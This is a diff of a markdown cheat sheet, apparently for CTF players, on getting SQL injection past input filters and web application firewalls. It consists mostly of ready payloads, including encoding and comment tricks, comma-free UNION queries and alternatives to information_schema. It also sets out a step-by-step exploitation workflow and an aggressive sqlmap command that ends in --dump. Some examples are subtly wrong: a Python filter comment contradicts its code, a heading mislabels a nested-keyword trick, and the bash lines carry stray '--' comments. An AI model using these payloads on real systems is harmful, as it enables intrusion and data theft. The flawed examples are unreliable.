@@ -1,336 +1,364 @@
-# SQL Injection - Filter & WAF Bypass
-
-## Overview
-Web Application Firewalls (WAF) and input filters try to block SQL injection. This guide covers techniques to bypass common filtering mechanisms.
+# SQL Injection — Filter & WAF Bypass
 
 ---
 
-## Common Filters & Bypasses
+## Quick Reference
 
-### 1. Space Filtering
+| What's Blocked | Bypass Method | Example |
+|----------------|--------------|---------|
+| Spaces | Comments / newlines | `UNION/**/SELECT` / `UNION%0ASELECT` |
+| `UNION`, `SELECT` | Case variation | `UnIoN SeLeCt` |
+| `UNION`, `SELECT` | Inline MySQL comments | `/*!UNION*//*!SELECT*/` |
+| Single quotes `'` | Hex encoding | `0x61646d696e` instead of `'admin'` |
+| Single quotes `'` | `CHAR()` function | `CHAR(97,100,109,105,110)` |
+| `--` `#` `/* */` | Natural close / null byte | `' AND '1'='1` / `';%00` |
+| `AND` / `OR` | Symbols | `&&` / `\|\|` |
+| `=` | `LIKE` / `IN` / `REGEXP` | `username LIKE 'admin'` |
+| `,` | `FROM … FOR` syntax | `SUBSTRING(s FROM 1 FOR 1)` |
+| `information_schema` | Alternate schemas | `pg_tables` / `sqlite_master` |
+| `SLEEP()` | Heavy query / GET_LOCK | `GET_LOCK('x',5)` |
 
-**Blocked**: `UNION SELECT`
-
-**Bypasses**:
 ```sql
-# Using comments
-UNION/**/SELECT
-UNION/*comment*/SELECT
-
-# Using newlines
-UNION%0ASELECT
-UNION%0DSELECT
-
-# Using tabs
-UNION%09SELECT
-
-# Using plus signs (in some contexts)
-UNION+SELECT
-
-# Using parentheses
-UNION(SELECT)
-UNION%28SELECT%29
-
-# Combining methods
-/*!UNION*//*!SELECT*/
+-- Bypass cheatsheet: try in order
+UnIoN SeLeCt                    -- 1. case variation
+UNION/**/SELECT                  -- 2. comment as space
+/*!UNION*//*!SELECT*/            -- 3. MySQL inline comments
+UNION%0ASELECT                   -- 4. URL-encoded newline
+UNION%09SELECT                   -- 5. tab as space
+' && 1=1--                       -- 6. && instead of AND
+username LIKE 0x61646d696e--     -- 7. hex instead of quotes
+SUBSTRING(s FROM 1 FOR 1)        -- 8. comma-free substring
 ```
 
 ---
 
-### 2. `UNION` and `SELECT` Filtering
+## What is Filter & WAF Bypass? 🔓
 
-**Blocked**: Keywords like `UNION`, `SELECT`, `WHERE`, `FROM`
+WAFs and input filters try to detect SQL injection by matching known keywords, symbols, or patterns. Bypass means expressing the **exact same SQL logic** using syntax the filter doesn't recognize — changing the form without changing the meaning.
 
-**Bypasses**:
+**Impact:**
+- 🔴 Turns a "blocked" injection into a working one
+- 🔴 Unlocks UNION, blind, and error-based attacks on protected targets
+- 🔴 Most CTF SQLi challenges have at least one filter layer
+- ⚠️ Requires understanding *what* is blocked before picking a bypass
 
-#### Case Variation
+**The core idea:**
+
+```sql
+-- Blocked by WAF:
+' UNION SELECT username,password FROM users--
+
+-- Bypassed — same logic, different syntax:
+' /*!UNION*/ /*!SELECT*/ username,password FROM users--
+```
+
+---
+
+## Detecting What's Blocked
+
+Before guessing bypass methods, probe the filter systematically — one component at a time.
+
+**Step 1 — Isolate each keyword:**
+
+```sql
+' UNION--        -- is UNION blocked?
+' SELECT--       -- is SELECT blocked?
+' OR 1=1--       -- is OR blocked?
+' AND 1=1--      -- is AND blocked?
+'/**/--          -- are comments blocked?
+' SLEEP(1)--     -- is SLEEP blocked?
+```
+
+**Step 2 — Check encoding handling:**
+
+```sql
+%27             -- URL-decoded ' — does the app decode before filtering?
+%2527           -- double-encoded ' — does the WAF decode only once?
+```
+
+**Step 3 — Read error messages carefully:**
+- `"blocked by WAF"` → external WAF, try encoding
+- `"syntax error"` → filter stripped keywords, payload reached DB broken
+- No response / 403 → WAF blocking at network level
+- Normal page → filter passed, injection may be working
+
+---
+
+## Keyword & Space Bypasses
+
+The most common filters target SQL keywords and whitespace between them.
+
+**Space alternatives — all equivalent to a single space:**
+
+```sql
+UNION/**/SELECT                  -- inline comment
+UNION/*anything*/SELECT          -- comment with content
+UNION%09SELECT                   -- horizontal tab
+UNION%0ASELECT                   -- newline (LF)
+UNION%0DSELECT                   -- carriage return (CR)
+UNION%0D%0ASELECT                -- CRLF
+UNION+SELECT                     -- plus (URL context only)
+(UNION)(SELECT)                  -- parentheses wrapping
+```
+
+**Keyword case variation — SQL is case-insensitive:**
+
 ```sql
 UnIoN SeLeCt
 uNiOn sElEcT
-UNION SELECT
-union select
+UNION select
+union SELECT
 ```
 
-#### Inline Comments (MySQL)
+**MySQL inline version comments — executed by MySQL, ignored by many WAFs:**
+
 ```sql
 /*!UNION*//*!SELECT*/
-/*!50000UNION*//*!50000SELECT*/  # Version-specific comments
+/*!50000UNION*//*!50000SELECT*/     -- version-gated: runs on MySQL >= 5.0.0
+/*!32302UNION*//*!32302SELECT*/     -- runs on MySQL >= 3.23.02
 ```
 
-#### Double Encoding
-```sql
-%2555nion %2553elect   # Double URL encode
-```
+⚠️ Version-gated comments (`/*!VVVVVV*/`) only execute on MySQL/MariaDB. Use them when the target is confirmed MySQL.
 
-#### Mixed Case + Comments
-```sql
-UnIoN/**/SeLeCt
-uNiOn/*comment*/sElEcT
-```
+**Combine multiple bypasses:**
 
-#### Using SQL Functions
 ```sql
-# If SELECT is blocked, try alternatives
-SELECT -> (SELECT)
-WHERE -> HAVING
-AND -> &&
-OR -> ||
+/*!50000UnIoN*//**//*!50000SeLeCt*/
+UnIoN/*comment*/SeLeCt/**/1,2,3--
 ```
 
 ---
 
-### 3. Quote Filtering
+## Quote & String Bypasses
 
-**Blocked**: Single quotes `'` or double quotes `"`
+When single quotes `'` are stripped or escaped, encode the string value instead.
 
-**Bypasses**:
+**Hex encoding (MySQL, MariaDB, SQLite):**
 
-#### Hexadecimal Encoding
 ```sql
-# Instead of: username='admin'
-username=0x61646d696e
+-- Instead of: WHERE username='admin'
+WHERE username=0x61646d696e
 
-# Instead of: ' UNION SELECT 'admin'
-' UNION SELECT 0x61646d696e
+-- Instead of: UNION SELECT 'flag'
+UNION SELECT 0x666c6167
+
+-- Quick hex encoder:
+-- 'admin' -> 0x61646d696e
+-- 'users' -> 0x7573657273
+-- 'flag'  -> 0x666c6167
 ```
 
-#### Using `CHAR()` Function
+**CHAR() function — works on all engines:**
+
 ```sql
-# Instead of: 'admin'
+-- Instead of: 'admin'
 CHAR(97,100,109,105,110)
 
-# Full example
-' UNION SELECT CHAR(97,100,109,105,110)--
+-- Instead of: 'a'
+CHAR(97)
+
+-- Full example:
+' UNION SELECT NULL,CHAR(97,100,109,105,110),NULL--
 ```
 
-#### Numeric Context (if possible)
+**String without quotes using numeric context:**
+
 ```sql
-# If you control a numeric parameter
-id=1 OR 1=1
-id=1 UNION SELECT 1,2,3
+-- If the parameter is numeric, no quotes needed
+?id=1 UNION SELECT 1,2,3--
+?id=1 OR 1=1--
+```
+
+**PostgreSQL / Oracle dollar-quoting:**
+
+```sql
+-- PostgreSQL: $$string$$ is equivalent to 'string'
+WHERE username=$$admin$$
 ```
 
 ---
 
-### 4. Comment Filtering
+## Comment & Termination Bypasses
 
-**Blocked**: `--`, `#`, `/* */`
+When `--`, `#`, and `/* */` are all blocked, close the query naturally instead.
 
-**Bypasses**:
+**Natural string close — no comment needed:**
 
-#### Using Null Byte
+```sql
+-- Original query: WHERE id='INPUT' AND active=1
+-- Inject:
+' AND '1'='1     -- closes cleanly: WHERE id='' AND '1'='1' AND active=1
+
+-- Login bypass without any comment:
+' OR 'a'='a      -- WHERE user='' OR 'a'='a' AND pass=''
+```
+
+**Null byte termination:**
+
 ```sql
 ';%00
+'%00
+' UNION SELECT NULL,NULL%00
 ```
 
-#### Using Newlines
+**Newline as terminator (some parsers):**
+
 ```sql
 '%0A
-'%0D
-```
-
-#### No Comment Needed
-```sql
-# Close the query naturally
-' AND '1'='1
-
-# Example
-?id=1' AND '1'='1' AND username='admin' AND '1'='1
-```
-
-#### Semicolon Termination
-```sql
-';
+'%0D%0A
 ```
 
 ---
 
-### 5. `OR` and `AND` Filtering
+## Operator & Logic Bypasses
 
-**Blocked**: `OR`, `AND`
+When `AND`, `OR`, and `=` are blocked, substitute equivalent operators.
 
-**Bypasses**:
+**AND / OR alternatives:**
+
 ```sql
-# Use symbols
-AND -> &&
-OR -> ||
+AND  →  &&   →  %26%26
+OR   →  ||   →  %7C%7C
 
-# Example
-' && 1=1
-' || 1=1
+-- Examples:
+' && 1=1--
+' || 1=1--
+' %26%26 1=1--
+```
 
-# Using case variation
-Or
-oR
-AnD
-aNd
+**Equals sign alternatives:**
+
+```sql
+=  →  LIKE          -- WHERE username LIKE 'admin'
+=  →  IN(...)       -- WHERE username IN ('admin')
+=  →  REGEXP        -- WHERE username REGEXP '^admin$'  (MySQL)
+=  →  BETWEEN       -- WHERE id BETWEEN 1 AND 1
+=  →  NOT <>        -- WHERE NOT username <> 'admin'
+```
+
+**NOT IN / subquery tricks:**
+
+```sql
+-- Instead of: WHERE id=1
+WHERE id NOT IN (2,3,4,5)
+
+-- Instead of: AND username='admin'
+AND username NOT IN ('guest','user','test')
 ```
 
 ---
 
-### 6. Equals Sign Filtering
+## Comma Bypass
 
-**Blocked**: `=`
+Some WAFs block commas to prevent UNION column lists. Express the same thing without them.
 
-**Bypasses**:
+**UNION without commas — use JOIN:**
+
 ```sql
-# Use LIKE
-username LIKE 'admin'
+-- Blocked:
+' UNION SELECT 1,2,3--
 
-# Use IN
-username IN ('admin')
+-- Bypass with JOIN:
+' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--
+```
 
-# Use comparison operators
-username>'admi' AND username<'adminz'
+**Substring without commas:**
 
-# Use REGEXP (MySQL)
-username REGEXP '^admin$'
+```sql
+-- Blocked: SUBSTRING(str,1,1)
+SUBSTRING(str FROM 1 FOR 1)     -- MySQL / PostgreSQL
+MID(str FROM 1 FOR 1)           -- MySQL
+SUBSTR(str FROM 1 FOR 1)        -- PostgreSQL / SQLite
+```
+
+**LIMIT without commas:**
+
+```sql
+-- Blocked: LIMIT 0,1
+LIMIT 1 OFFSET 0                -- MySQL / PostgreSQL / SQLite
 ```
 
 ---
 
-### 7. Comma Filtering
+## information_schema Bypass
 
-**Blocked**: `,` (in UNION or function calls)
+When `information_schema` is blocked, use database-native alternatives.
 
-**Bypasses**:
+**MySQL / MariaDB alternatives:**
 
-#### For `UNION SELECT`
 ```sql
-# Use JOIN or OFFSET
-UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b
-
-# Use parentheses and OFFSET (PostgreSQL)
-UNION SELECT * FROM (SELECT 1) OFFSET 0
-```
-
-#### For Function Arguments
-```sql
-# Instead of: SUBSTRING(str,1,1)
-SUBSTRING(str FROM 1 FOR 1)
-
-# Instead of: MID(str,1,1)  
-MID(str FROM 1 FOR 1)
-
-# Instead of: CONCAT(a,b,c)
-CONCAT(a||b||c)
-```
-
----
-
-### 8. Concatenation Operator Filtering
-
-**Blocked**: `CONCAT()` function
-
-**Bypasses**:
-```sql
-# MySQL - Use pipe operator if allowed
-SELECT 'a'||'b'
-
-# Use CONCAT_WS()
-CONCAT_WS('','a','b','c')
-
-# Use mathematical operations
-SELECT 0+database()
-```
-
----
-
-### 9. `information_schema` Filtering
-
-**Blocked**: `information_schema` keyword
-
-**Bypasses**:
-
-#### MySQL
-```sql
-# Use sys schema (MySQL 5.7+)
+-- sys schema (MySQL 5.7+)
 SELECT table_name FROM sys.x$schema_table_statistics
 
-# Use mysql.innodb_table_stats
+-- InnoDB stats table
 SELECT database_name,table_name FROM mysql.innodb_table_stats
 
-# Hex encoding
+-- Hex-encode the schema name
 SELECT table_name FROM 0x696e666f726d6174696f6e5f736368656d61.tables
 ```
 
-#### PostgreSQL
-```sql
-# Use pg_catalog
-SELECT tablename FROM pg_tables
+**PostgreSQL alternatives:**
 
-# Use pg_class
+```sql
+SELECT tablename FROM pg_tables WHERE schemaname='public'
 SELECT relname FROM pg_class WHERE relkind='r'
+SELECT column_name FROM pg_attribute pa JOIN pg_class pc ON pa.attrelid=pc.oid WHERE pc.relname='users'
+```
+
+**SQLite (no information_schema at all):**
+
+```sql
+SELECT name FROM sqlite_master WHERE type='table'
+SELECT sql FROM sqlite_master WHERE name='users'   -- returns CREATE TABLE
+```
+
+**Oracle alternatives:**
+
+```sql
+SELECT table_name FROM all_tables
+SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
+SELECT table_name FROM user_tables    -- current user's tables only
 ```
 
 ---
 
-### 10. `SLEEP()` and Time-Based Function Filtering
+## Encoding & Obfuscation Reference
 
-**Blocked**: `SLEEP()`, `BENCHMARK()`, `WAITFOR`
+**URL encoding — one layer:**
 
-**Bypasses**:
+| Char | Encoded |
+|------|---------|
+| `'` | `%27` |
+| `"` | `%22` |
+| ` ` | `%20` or `+` |
+| `#` | `%23` |
+| `=` | `%3d` |
+| `(` | `%28` |
+| `)` | `%29` |
+| `,` | `%2c` |
+| `\|` | `%7c` |
+| `&` | `%26` |
 
-#### Heavy Queries (MySQL)
-```sql
-# Use computationally expensive operations
-' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B)>0--
+**Double URL encoding — bypasses WAFs that decode only once:**
 
-# Use GET_LOCK with timeout
-' AND GET_LOCK('lock',5)--
+```
+'   → %27  → %2527
+/   → %2f  → %252f
 ```
 
-#### PostgreSQL Alternative
-```sql
-' || (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END)--
+**Hex string values (MySQL):**
+
+```
+'admin' → 0x61646d696e
+'users' → 0x7573657273
+'flag'  → 0x666c6167
+'1'     → 0x31
 ```
 
----
+**Scientific notation for numeric bypass:**
 
-## Advanced Bypass Techniques
-
-### 1. SQL Inline Comments (MySQL)
 ```sql
-/*!UNION*//*!SELECT*/
-/*!12345UNION*//*!12345SELECT*/
-/*!50000UNION*//*!50000SELECT*/  # Version specific
-
-# Full example
-?id=1'/*!UNION*//*!SELECT*/1,2,3--+
-```
-
-### 2. Buffer Overflow / Encoding Tricks
-```sql
-# URL double encoding
-%2527 -> %27 -> '
-%252f -> %2f -> /
-
-# Unicode bypass
-%u0027 -> '
-%u02b9 -> ʹ (might be normalized to ')
-```
-
-### 3. Parameter Pollution
-```sql
-# Send multiple parameters with same name
-?id=1&id=' UNION SELECT--
-?id=1' OR '1'='1&id=1
-
-# Backend might concatenate or use first/last
-```
-
-### 4. HTTP Parameter Pollution (HPP)
-```sql
-# Some WAFs only check first parameter
-?id=1&id=1' UNION SELECT 1,2,3--
-
-# Or last parameter
-?id=1' UNION SELECT 1,2,3--&id=1
-```
-
-### 5. Scientific Notation (for numeric bypass)
-```sql
-# Instead of: id=1
+-- Instead of: id=1
 id=1e0
 id=1.0
 id=0.1e1
@@ -338,130 +366,129 @@ id=0.1e1
 
 ---
 
-## WAF-Specific Bypasses
+## sqlmap Tamper Scripts
 
-### ModSecurity CRS Bypass
-```sql
-# Using null bytes
-?id=1%00' UNION SELECT--
+sqlmap has built-in tampers for every common filter. Combine them as needed.
 
-# Using tampered spacing
-?id=1'UnIoN(SeLeCt 1,2,3)--
-```
-
-### Cloudflare WAF Bypass
-```sql
-# Case variation often works
-?id=1'uNiOn+sElEcT--
-
-# Using encoded newlines
-?id=1'%0AUNION%0ASELECT--
-```
-
----
-
-## Testing Strategy
-
-1. **Identify what's blocked**: Test each component separately
-   ```sql
-   ' UNION      # Is UNION blocked?
-   ' SELECT     # Is SELECT blocked?
-   ' OR         # Is OR blocked?
-   ```
-
-2. **Test bypass methods**: Try each bypass technique
-   ```sql
-   UnIoN        # Case variation
-   /*!UNION*/   # Inline comment
-   %55nion      # URL encoding
-   ```
-
-3. **Combine techniques**: Use multiple bypasses together
-   ```sql
-   /*!50000UnIoN*//**//*!50000SeLeCt*/
-   ```
-
-4. **Monitor responses**: Check for different error messages or behavior
-
----
-
-## Encoding Reference
-
-### URL Encoding
-```
-Space: %20, +
-' : %27
-" : %22
-# : %23
-/ : %2f
-\ : %5c
-( : %28
-) : %29
-= : %3d
-```
-
-### Hex Encoding (MySQL)
-```sql
-admin -> 0x61646d696e
-user  -> 0x75736572
-```
-
-### Character Encoding
-```sql
-a -> CHAR(97)
-A -> CHAR(65)
-```
-
----
-
-## CTF-Specific Tips
-
-1. **Check allowed characters**: Some CTFs whitelist characters - focus on what works
-2. **Try alternate syntax**: Different databases, different bypass methods
-3. **Look for hints in source code**: Sometimes filter implementation is shown
-4. **Test systematically**: Don't randomly try payloads - understand what's blocked
-5. **Use automation**: Tools like sqlmap have tamper scripts
-
-### sqlmap Tamper Scripts
 ```bash
-# List available tamper scripts
+# List all available tampers
 sqlmap --list-tampers
 
-# Common useful tampers
-sqlmap -u "URL" --tamper=space2comment
-sqlmap -u "URL" --tamper=between
-sqlmap -u "URL" --tamper=charencode
-sqlmap -u "URL" --tamper=equaltolike
+# Most useful for CTFs:
+sqlmap -u "URL?id=1" --tamper=space2comment         -- spaces → /**/
+sqlmap -u "URL?id=1" --tamper=between                -- = → BETWEEN
+sqlmap -u "URL?id=1" --tamper=charencode             -- URL-encode chars
+sqlmap -u "URL?id=1" --tamper=equaltolike            -- = → LIKE
+sqlmap -u "URL?id=1" --tamper=randomcase             -- RaNdOm CaSe
+sqlmap -u "URL?id=1" --tamper=hex2char               -- strings → CHAR()
+sqlmap -u "URL?id=1" --tamper=space2plus             -- spaces → +
+sqlmap -u "URL?id=1" --tamper=percentage             -- injects % between chars
 
-# Combine multiple tampers
-sqlmap -u "URL" --tamper=space2comment,between,charencode
+# Combine multiple tampers (applied left to right)
+sqlmap -u "URL?id=1" --tamper=space2comment,between,charencode,randomcase
+
+# Full WAF bypass attempt
+sqlmap -u "URL?id=1" --tamper=space2comment,between,equaltolike,randomcase --random-agent --level=5 --risk=3 --batch --dump
 ```
 
 ---
 
-## Quick Bypass Checklist
+## Exploitation Workflow
+
+1. **Confirm injection exists** — `'` causes error or behavior change before worrying about WAF
+2. **Identify the filter type** — WAF (403/blocked page) vs app-level filter (broken syntax reaching DB)
+3. **Probe blocked components** — test `UNION`, `SELECT`, `OR`, `AND`, spaces, quotes individually
+4. **Start with simplest bypass** — case variation → comment spacing → inline comments → encoding
+5. **Bypass quotes if needed** — switch strings to hex `0x…` or `CHAR()`
+6. **Bypass operators if needed** — replace `AND`/`OR` with `&&`/`||`, `=` with `LIKE`
+7. **Bypass commas if needed** — use `JOIN` for UNION columns, `FROM … FOR` for SUBSTRING
+8. **Bypass information_schema if needed** — use native schema tables for the identified DB
+9. **Combine techniques** — layer case variation + comment spacing + encoding together
+10. **Automate with sqlmap tampers** — once you know what's blocked, pick matching tamper scripts
+
+---
+
+## Common Vulnerable Patterns
+
+**Blacklist filter — easily bypassed by case:**
+
+```python
+# ❌ Vulnerable filter — blocks lowercase keywords only
+blocked = ['union', 'select', 'or', 'and']
+for word in blocked:
+    if word in user_input.lower():  # ← .lower() makes this useless
+        return "blocked"
+# Bypass: UnIoN SeLeCt still passes if check uses user_input directly
+```
+
+**Strip-once filter — double encoding survives:**
+
+```php
+// ❌ Vulnerable — strips SQL words once, doesn't re-check
+$input = str_replace(['UNION','SELECT'], '', strtoupper($input));
+// Bypass: UNUNIONION SELSELECTECT → after strip → UNION SELECT
+```
+
+**Space-only filter — comment spacing bypasses it:**
+
+```python
+# ❌ Vulnerable — only blocks literal spaces
+if ' ' in user_input:
+    return "blocked"
+# Bypass: UNION/**/SELECT — no spaces, still valid SQL
+```
+
+**WAF checking GET only — POST body unfiltered:**
+
+```http
+# ❌ Misconfigured WAF — only inspects query string
+GET /search?q=safe HTTP/1.1
+
+# Bypass: move injection to POST body
+POST /search HTTP/1.1
+q=' UNION SELECT username,password FROM users--
+```
+
+---
+
+## CTF & Practical Tips
+
+**Systematic test order — try in sequence:**
 
 ```sql
-# Basic bypasses to try:
-UnIoN SeLeCt              # Case variation
-UNION/**/SELECT           # Comment spacing
-/*!UNION*//*!SELECT*/     # Inline comments
-UNION%0ASELECT            # Newline
-0x61646d696e              # Hex encoding (for 'admin')
-CHAR(97,100,109,105,110)  # CHAR encoding
-AND -> &&                 # Symbol replacement
-OR -> ||                  # Symbol replacement
-= -> LIKE                 # Operator replacement
-' -> %27 -> %2527         # Double encoding
+' UNION SELECT 1,2,3--             -- baseline: is anything blocked?
+' UnIoN SeLeCt 1,2,3--            -- case bypass
+' UNION/**/SELECT/**/1,2,3--      -- comment spacing
+'/*!UNION*//*!SELECT*/1,2,3--     -- MySQL inline comments
+' UNION%0ASELECT%0A1,2,3--        -- newline spacing
+' %55NION %53ELECT 1,2,3--        -- partial URL encoding
 ```
+
+**Speed tips:**
+- ✅ Always identify *what* is blocked before picking a bypass — don't spray randomly
+- ✅ Check if the filter strips keywords once — try `UNUNIONION` and `SELSELECTECT`
+- ✅ MySQL inline comments `/*!*/` are the most powerful single bypass — try them early
+- ✅ Hex-encode all string values when quotes are blocked — `0x…` never needs quotes
+- ✅ sqlmap `--tamper=space2comment,randomcase` covers 80% of CTF WAFs
+- ⚠️ A 403 means the WAF blocked the request; a syntax error means it reached the DB broken — treat them differently
+
+**Common CTF filter scenarios:**
+
+- **Spaces blocked** → `UNION/**/SELECT` or `%0A`
+- **UNION/SELECT blocked (case-sensitive)** → `UnIoN SeLeCt`
+- **UNION/SELECT blocked (any case)** → `/*!UNION*/` or `UNUNIONION` (strip-once)
+- **Quotes blocked** → hex `0x61646d696e` or `CHAR(97,100,109,105,110)`
+- **AND/OR blocked** → `&&` / `||`
+- **Commas blocked** → `JOIN` trick + `SUBSTRING(s FROM 1 FOR 1)`
+- **information_schema blocked** → `pg_tables` / `sqlite_master` / `all_tables`
 
 ---
 
-## Resources & Tools
+## Key Takeaways
 
-- **sqlmap**: Automated with built-in bypass techniques
-- **Burp Suite**: Manual testing with Intruder for fuzzing
-- **OWASP ZAP**: Alternative to Burp
-- **Hackvertor**: Burp extension for encoding chains
-
-Remember: Bypassing filters is about understanding what's blocked and finding creative alternatives. Think like the filter - what patterns is it looking for? How can you express the same logic differently?
+- ✅ Identify *what* is blocked before picking a bypass — probe each component separately
+- ✅ Case variation and comment spacing are the fastest first attempts
+- ✅ MySQL `/*!UNION*/` inline comments bypass most pattern-matching WAFs in one shot
+- ✅ Hex encoding (`0x…`) eliminates the need for quotes entirely — essential when `'` is filtered
+- ✅ Strip-once filters fold under `UNUNIONION` / `SELSELECTECT` — always worth trying
+- ✅ sqlmap tamper scripts automate all of this — use `space2comment,randomcase,between` as a starting stack
